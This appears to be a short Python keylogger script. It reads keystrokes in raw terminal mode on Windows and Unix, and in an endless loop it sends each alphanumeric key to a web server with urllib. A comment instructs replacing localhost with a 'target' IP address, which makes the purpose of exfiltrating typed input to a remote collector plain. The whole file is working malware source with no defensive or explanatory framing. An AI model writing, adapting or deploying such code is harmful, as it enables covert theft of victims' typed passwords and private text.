import os
import urllib.request


def getkey():
    # Windows
    if os.name == 'nt':
        import msvcrt
        key = msvcrt.getch()
        if key == b'\xe0':
            msvcrt.getch()
        return key.decode()
    # Unix-based systems
    else:
        import sys
        import tty
        import termios
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            ch = sys.stdin.read(1)
            if ch == '\x1b':
                sys.stdin.read(2)
            return ch
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)


while True:
    key = getkey()
    if key.isalnum():
        # replace locahost:8000 with <your target ip adrees>:8000
        urllib.request.urlopen(f"http://localhost:8000/{key}")
